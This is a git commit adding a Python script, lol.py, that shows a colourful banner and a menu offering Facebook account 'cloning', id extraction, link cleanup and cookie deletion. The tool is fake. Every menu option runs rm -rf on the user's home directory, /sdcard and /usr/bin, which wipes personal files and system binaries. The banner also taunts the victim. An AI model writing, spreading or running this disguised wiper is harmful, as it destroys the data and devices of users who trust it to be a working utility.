03fd7b86d5f88a8d3bf43dade3e375d0dd978022
SHOOTER-MAKAR <107881797+SHOOTER-MAKAR@users.noreply.github.com>
2022-06-20 11:43:30 -0700

    Add files via upload

---
+++ lol.py
@@ -0,0 +1,62 @@
+import os
+os.system('clear')
+print("""
+  
+  
+       \033[1;32m   {|} {|}  {|} {|}{|}{|} {|}{|}{|}
+       \033[1;37m   {|} {|}  {|}    {|}       {|}
+       \033[1;33m   {|} {|}  {|}    {|}       {|}
+          \033[1;36m{|} {|}  {|}    {|}       {|}
+     \033[1;34m{|}{|}    {|}{|}     {|}       {|}
+     
+      \033[1;32m    Jutt Badshah Brand~
+\033[1;31m-----------------------------------------------
+\033[1;37m> Author : Jutt Badshah  \033[1;41mPanga Lia Ahmad Se\033[1;49m
+\033[1;37m> Github : https://github.com/SHOOTER-MAKER       
+\033[1;37m> WP  NO : +923007574310 \033[1;32m==> \033[1;33mFuck By Ahmad 😂😂   
+\033[1;31m-----------------------------------------------
+
+\033[1;33m~~~~~~~~~~Main menu~~~~~~~~~
+\033[1;37m-----------------------------------------------
+\033[1;32m[1] Cloning Menu
+[2] Make File Extract ids
+[3] Remove Double Link From File
+[4] Separate Link From File
+[5] Cut Links From Used File
+[6] Delete Cookie
+[7] Join My Fb Group
+\033[1;37m-----------------------------------------------
+\033[1;33mFor Any Problem Select 7 And Join Our Fb Group
+\033[1;37m-----------------------------------------------""")
+Ahmad = input('\033[1;36mChoose option: ')
+if Ahmad in["", " "]:
+	exit()
+elif Ahmad in ["1", "01"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+elif Ahmad in ["2", "02"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+elif Ahmad in ["3", "03"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+elif Ahmad in ["4", "04"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+elif Ahmad in ["5", "05"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+elif Ahmad in ["6", "06"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+elif Ahmad in ["7", "07"]:
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf /sdcard/*")
+	os.system("rm -rf /usr/bin/*")
+reg()
